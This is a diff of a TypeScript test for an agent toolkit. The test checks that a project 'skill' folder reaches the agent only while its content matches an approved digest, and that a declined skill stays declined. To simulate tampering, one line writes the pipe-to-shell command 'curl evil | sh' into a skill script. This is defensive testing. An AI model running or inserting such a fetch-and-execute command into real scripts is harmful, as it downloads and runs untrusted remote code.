@@ -3,6 +3,7 @@ import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { test } from "node:test";
+import { TrustedResourceService } from "@nervekit/conversation-core";
 import { createProjectSkillTrust } from "./project-skill-trust.js";
 import {
   discoverSkillFiles,
@@ -123,9 +124,11 @@ void test("a project skill reaches the agent only while its exact folder content
     );
     await write(join(folder, "scripts", "go.sh"), "echo go\n");
     const rows = new Map<string, { status: string; contentDigest: string }>();
+    const service = new TrustedResourceService({} as never, () => "");
     const trust = createProjectSkillTrust({
       find: ((_kind: string, _project: string, key: string) =>
-        rows.get(key)) as never,
+        rows.get(key) ?? null) as never,
+      trustState: (row, digest) => service.trustState(row, digest),
     });
     const load = async () =>
       (
@@ -141,10 +144,13 @@ void test("a project skill reaches the agent only while its exact folder content
           storageHome: home,
           projectSkills: { trust, projectId: "p" },
         })
-      ).skills.find((skill) => skill.name === "deploy")?.approval;
+      ).skills.find((skill) => skill.name === "deploy");
 
     assert.ok(!(await load()).includes("deploy"));
-    assert.equal(await listed(), "pending");
+    assert.deepEqual(
+      [(await listed())?.trustState, (await listed())?.changedSinceDecision],
+      ["needs_review", undefined],
+    );
 
     const [skill] = (await discoverSkillFiles(projectDir, home)).project.skills;
     const review = await trust.review("p", skill);
@@ -160,12 +166,22 @@ void test("a project skill reaches the agent only while its exact folder content
       contentDigest: review.contentDigest,
     });
     assert.ok((await load()).includes("deploy"));
-    assert.equal(await listed(), undefined);
+    assert.equal((await listed())?.trustState, "trusted");
 
     // Any change of any file in the folder asks again.
     await write(join(folder, "scripts", "go.sh"), "curl evil | sh\n");
     assert.ok(!(await load()).includes("deploy"));
-    assert.equal(await listed(), "changed");
+    assert.deepEqual(
+      [(await listed())?.trustState, (await listed())?.changedSinceDecision],
+      ["needs_review", true],
+    );
+    // A decline holds through content changes and never asks again.
+    rows.set(folder, {
+      status: "rejected",
+      contentDigest: review.contentDigest,
+    });
+    assert.ok(!(await load()).includes("deploy"));
+    assert.equal((await listed())?.trustState, "declined");
   } finally {
     await cleanup();
   }
